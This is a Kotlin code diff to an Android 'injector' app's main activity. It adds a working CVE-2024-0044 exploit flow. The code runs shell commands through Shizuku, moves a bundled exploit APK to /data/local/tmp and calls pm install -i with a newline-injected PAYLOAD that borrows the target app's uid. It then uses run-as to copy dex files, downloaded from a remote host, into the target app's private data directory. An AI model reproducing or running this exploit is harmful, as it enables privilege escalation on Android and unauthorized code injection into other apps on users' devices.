@@ -40,6 +40,8 @@ import com.wunelezi.injector.model.InjectionMethod
 import com.wunelezi.injector.model.LoadResult
 import com.wunelezi.injector.model.ModuleInfo
 import com.wunelezi.injector.util.PluginManager
+import rikka.shizuku.Shizuku
+import rikka.shizuku.Shizuku.OnRequestPermissionResultListener
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
@@ -62,6 +64,12 @@ class MainActivity : AppCompatActivity() {
     private val KEY_INJECTION_METHOD = "key_injection_method"
     /** 注入用基础 URL：intent2 序列化后的 intent scheme URI（url 编码）作为 ?intent= 参数拼接到此后 */
     private val INJECT_BASE_URL = "https://caofangkuai.github.io/WNLZ-Injector-dex/inject.html?intent="
+
+    /** Shizuku 权限请求码 */
+    private val SHIZUKU_PERMISSION_REQUEST_CODE = 9527
+
+    /** 待处理的 Shizuku 权限授予回调 */
+    private var shizukuPermissionCallback: ((Boolean) -> Unit)? = null
 
     /** 加载对话框 */
     private var loadingDialog: Dialog? = null
@@ -154,6 +162,23 @@ class MainActivity : AppCompatActivity() {
 
         // 检查是否从 StartAnyWhere 回调返回
         checkStartAnyWhereCallback(intent)
+
+        // 注册 Shizuku 权限请求结果回调（CVE-2024-0044 注入方式需要）
+        Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)
+    }
+
+    /** Shizuku 权限请求结果监听 */
+    private val shizukuPermissionListener = OnRequestPermissionResultListener { requestCode, grantResult ->
+        if (requestCode == SHIZUKU_PERMISSION_REQUEST_CODE) {
+            val cb = shizukuPermissionCallback
+            shizukuPermissionCallback = null
+            cb?.invoke(grantResult == android.content.pm.PackageManager.PERMISSION_GRANTED)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        Shizuku.removeRequestPermissionResultListener(shizukuPermissionListener)
     }
 
     override fun onNewIntent(intent: Intent) {
@@ -443,7 +468,6 @@ class MainActivity : AppCompatActivity() {
                 moduleAdapter?.notifyDataSetChanged()
                 if (loadResult.modules.isEmpty()) {
                     dialogBinding.tvEmpty.visibility = View.VISIBLE
-                    showLoadErrorDialog(loadResult)
                 }
             }
         }
@@ -465,34 +489,14 @@ class MainActivity : AppCompatActivity() {
             val result = PluginManager.importPlugin(this@MainActivity, packageName, uri)
             withContext(Dispatchers.Main) {
                 if (result.success) {
-                    // 导入成功也展示详情, 方便用户确认
-                    showImportResultDialog(result, packageName)
+                    // 导入成功：仅弹出 toast，并静默刷新模块列表
+                    Toast.makeText(this@MainActivity, R.string.toast_import_success, Toast.LENGTH_SHORT).show()
+                    refreshModuleList(packageName)
                 } else {
                     showImportErrorDialog(result)
                 }
             }
         }
-    }
-
-    /**
-     * 显示导入成功详情对话框（含刷新列表）
-     */
-    private fun showImportResultDialog(result: ImportResult, packageName: String) {
-        val logsText = result.logs.joinToString("\n")
-        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
-            .setTitle(R.string.dialog_import_success_title)
-            .setMessage(logsText)
-            .setPositiveButton(R.string.action_refresh) { _, _ ->
-                refreshModuleList(packageName)
-            }
-            .setNeutralButton(R.string.action_copy_log) { _, _ ->
-                val clipboard = getSystemService(android.content.ClipboardManager::class.java)
-                val clip = android.content.ClipData.newPlainText("import_log", logsText)
-                clipboard?.setPrimaryClip(clip)
-                Toast.makeText(this, R.string.toast_copied, Toast.LENGTH_SHORT).show()
-            }
-            .setNegativeButton(R.string.action_cancel, null)
-            .show()
     }
 
     /**
@@ -516,24 +520,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     /**
-     * 显示模块加载详情对话框（列表为空时调用）
-     */
-    private fun showLoadErrorDialog(result: LoadResult) {
-        val logsText = result.logs.joinToString("\n")
-        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
-            .setTitle(R.string.dialog_load_empty_title)
-            .setMessage(logsText)
-            .setPositiveButton(R.string.action_confirm, null)
-            .setNeutralButton(R.string.action_copy_log) { _, _ ->
-                val clipboard = getSystemService(android.content.ClipboardManager::class.java)
-                val clip = android.content.ClipData.newPlainText("load_log", logsText)
-                clipboard?.setPrimaryClip(clip)
-                Toast.makeText(this, R.string.toast_copied, Toast.LENGTH_SHORT).show()
-            }
-            .show()
-    }
-
-    /**
      * 刷新模块列表
      */
     private fun refreshModuleList(packageName: String) {
@@ -544,9 +530,6 @@ class MainActivity : AppCompatActivity() {
                 moduleList.addAll(loadResult.modules)
                 moduleAdapter?.notifyDataSetChanged()
                 updateModuleSummary()
-                if (loadResult.modules.isEmpty()) {
-                    showLoadErrorDialog(loadResult)
-                }
             }
         }
     }
@@ -679,6 +662,7 @@ class MainActivity : AppCompatActivity() {
         when (method) {
             InjectionMethod.START_ANYWHERE_NGWEBVIEW -> startStartAnyWhereInjection(packageName)
             InjectionMethod.START_ANYWHERE_ASSIST -> startStartAnyWhereAssistInjection(packageName)
+            InjectionMethod.CVE_2024_0044 -> startCve20240044Injection(packageName)
             else -> Toast.makeText(this, R.string.toast_injecting, Toast.LENGTH_SHORT).show()
         }
     }
@@ -897,6 +881,185 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }.start()
+    }
+
+    // ==================== CVE-2024-0044 注入流程 ====================
+
+    /** Shizuku 执行命令的返回结果 */
+    private data class ShellResult(val exitCode: Int, val output: String)
+
+    /**
+     * 通过 Shizuku 以系统/root 身份执行 shell 命令。
+     *
+     * 注意：Shizuku 13.x 的 Shizuku.newProcess(...) 为 private 静态方法，故通过反射调用；
+     * proguard-rules.pro 中已 keep rikka.shizuku.** 以免 release 构建被重命名/内联。
+     *
+     * @param command 要执行的命令（经 sh -c 执行）
+     * @param env     环境变量数组（形如 "KEY=VALUE"，可用于携带含换行的 PAYLOAD）
+     * @return 退出码与合并后的输出
+     */
+    private fun shizukuShell(command: String, env: Array<String>? = null): ShellResult {
+        val newProcess = Shizuku::class.java.getDeclaredMethod(
+            "newProcess",
+            Array<String>::class.java,
+            Array<String>::class.java,
+            String::class.java
+        ).apply { isAccessible = true }
+        val process = newProcess.invoke(null, arrayOf("sh", "-c", command), env, null) as Process
+        val out = process.inputStream.bufferedReader().use { it.readText() }
+        val err = process.errorStream.bufferedReader().use { it.readText() }
+        val exitCode = process.waitFor()
+        return ShellResult(exitCode, out + err)
+    }
+
+    /**
+     * 确保已获得 Shizuku 权限：未连接则提示，已授权直接回调，否则发起权限请求。
+     */
+    private fun ensureShizukuPermission(onGranted: () -> Unit) {
+        if (!Shizuku.pingBinder()) {
+            runOnUiThread {
+                showErrorDialog("Shizuku 未连接", Exception("Shizuku 服务未运行，请先启动 Shizuku（adb / 已 root 的 Shizuku）后再试。"))
+            }
+            return
+        }
+        if (Shizuku.checkSelfPermission() == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            onGranted()
+            return
+        }
+        shizukuPermissionCallback = { granted ->
+            if (granted) onGranted() else runOnUiThread {
+                showErrorDialog("Shizuku 权限被拒绝", Exception("用户未授予 Shizuku 权限。"))
+            }
+        }
+        Shizuku.requestPermission(SHIZUKU_PERMISSION_REQUEST_CODE)
+    }
+
+    /**
+     * CVE-2024-0044 入口：先请求 Shizuku 权限，授予成功后执行完整流程。
+     */
+    private fun startCve20240044Injection(targetPackage: String) {
+        ensureShizukuPermission {
+            runCveFlow(targetPackage)
+        }
+    }
+
+    /**
+     * CVE-2024-0044 完整流程：
+     *  1. 下载 dex zip（404 -> 提示 dialog）
+     *  2. 解压，遍历 dex 文件通过 writeUri 写入目标 app 的 widget_file_provider/widget_file_cache
+     *  3. 从 assets 解压 cve-2024-0044.apk 到本 app 私有目录
+     *  4. 通过 Shizuku 执行 mv 把 apk 移动到 /data/local/tmp
+     *  5. 获取目标应用 uid
+     *  6. 通过 Shizuku 以 PAYLOAD 环境变量（保留换行符）执行 pm install -i "$PAYLOAD"
+     *  7. 安装成功则通过 Shizuku 执行 run-as mcinject cp 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
+     *  8. toast 注入 dex 成功
+     * 任一步骤异常或命令非零退出均弹 dialog 报告。
+     */
+    private fun runCveFlow(targetPackage: String) {
+        showLoadingDialog()
+        Thread {
+            try {
+                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
+                val versionSegment = customVersion ?: run {
+                    val pi = packageManager.getPackageInfo(targetPackage, 0)
+                    val vName = pi.versionName ?: "unknown"
+                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
+                        pi.longVersionCode.toString()
+                    } else {
+                        @Suppress("DEPRECATION")
+                        pi.versionCode.toString()
+                    }
+                    "${vName}_$vCode"
+                }
+
+                // 1. 下载 dex zip
+                val zipFile = java.io.File(cacheDir, "wnlz_cve_$versionSegment.zip")
+                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
+                if (code == 404) {
+                    runOnUiThread { showNotFoundDialog() }
+                    return@Thread
+                }
+                if (code != 200) {
+                    throw java.io.IOException("下载 dex 失败 HTTP $code")
+                }
+
+                // 2. 解压并遍历 dex，通过 writeUri 写入 widget_file_provider/widget_file_cache
+                val extractDir = java.io.File(cacheDir, "wnlz_cve_$versionSegment")
+                extractDir.deleteRecursively()
+                extractDir.mkdirs()
+                val dexFiles = unzipZip(zipFile, extractDir)
+
+                for (dex in dexFiles) {
+                    val targetUri = "content://com.netease.x19.widget_file_provider/widget_file_cache/${dex.name}"
+                    val os = contentResolver.openOutputStream(Uri.parse(targetUri))
+                        ?: throw java.io.IOException("无法打开输出流: $targetUri")
+                    os.use { out ->
+                        dex.inputStream().use { it.copyTo(out) }
+                    }
+                }
+
+                // 3. 从 assets 解压 cve-2024-0044.apk 到本 app 私有目录
+                val apkFile = java.io.File(filesDir, "cve-2024-0044.apk")
+                assets.open("cve-2024-0044.apk").use { input ->
+                    apkFile.outputStream().use { input.copyTo(it) }
+                }
+
+                // 4. Shizuku 执行 mv 把 apk 移动到 /data/local/tmp
+                var r = shizukuShell("mv ${apkFile.absolutePath} /data/local/tmp/cve-2024-0044.apk")
+                if (r.exitCode != 0) {
+                    throw RuntimeException("mv cve-2024-0044.apk 失败 (exit ${r.exitCode}):\n${r.output}")
+                }
+
+                // 5. 获取目标应用 uid
+                val uid = packageManager.getApplicationInfo(targetPackage, 0).uid
+
+                // 6. PAYLOAD 环境变量（保留原始换行符） + pm install -i "$PAYLOAD"
+                val payload = """
+                    @null
+                    mcinject $uid 1 /data/user/0
+                    default:targetSdkVersion=28 none 0 0 1 @null
+                """.trimIndent()
+                r = shizukuShell(
+                    "pm install -i \"\$PAYLOAD\" /data/local/tmp/cve-2024-0044.apk",
+                    arrayOf("PAYLOAD=$payload")
+                )
+                if (r.exitCode != 0) {
+                    throw RuntimeException("pm install 失败 (exit ${r.exitCode}):\n${r.output}")
+                }
+
+                // 7. 安装成功：run-as mcinject 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
+                r = shizukuShell("run-as mcinject cp -f cache/classes*.dex \"app_ntp0/$versionSegment/.unzip/\"")
+                if (r.exitCode != 0) {
+                    throw RuntimeException("复制 dex 失败 (exit ${r.exitCode}):\n${r.output}")
+                }
+
+                // 8. 成功
+                runOnUiThread {
+                    hideLoadingDialog()
+                    Toast.makeText(this@MainActivity, "注入dex成功", Toast.LENGTH_LONG).show()
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    hideLoadingDialog()
+                    showInjectErrorDialog(e)
+                }
+            }
+        }.start()
+    }
+
+    /**
+     * 显示带自定义标题的错误对话框
+     */
+    private fun showErrorDialog(title: String, e: Exception) {
+        val errorMsg = StringBuilder()
+        errorMsg.append("${e.message}\n\n")
+        errorMsg.append("完整堆栈:\n")
+        e.stackTrace.take(15).forEach { errorMsg.append("  at $it\n") }
+        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
+            .setTitle(title)
+            .setMessage(errorMsg.toString())
+            .setPositiveButton(R.string.action_confirm, null)
+            .show()
     }
 
     /**
